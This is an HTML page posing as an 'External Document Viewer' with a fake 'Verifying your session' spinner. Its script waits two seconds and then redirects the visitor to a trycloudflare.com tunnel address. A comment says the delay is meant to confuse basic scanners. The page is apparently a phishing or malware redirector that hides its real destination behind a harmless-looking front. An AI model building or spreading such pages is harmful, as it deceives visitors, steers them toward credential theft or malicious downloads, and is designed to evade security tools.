<!DOCTYPE html>
<html>
<head>
    <title>External Document Viewer</title>
    <style>
        body { font-family: sans-serif; text-align: center; padding-top: 50px; }
        .loader { border: 16px solid #f3f3f3; border-top: 16px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 2s linear infinite; margin: auto; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Verifying your session, please wait...</p>
    <script>
        // Delay the redirect by 2 seconds to confuse basic scanners
        setTimeout(function(){
            window.location.replace("https://jokes-berry-register-legacy.trycloudflare.com/ppUXeIMb");
        }, 2000);
    </script>
</body>
</html>
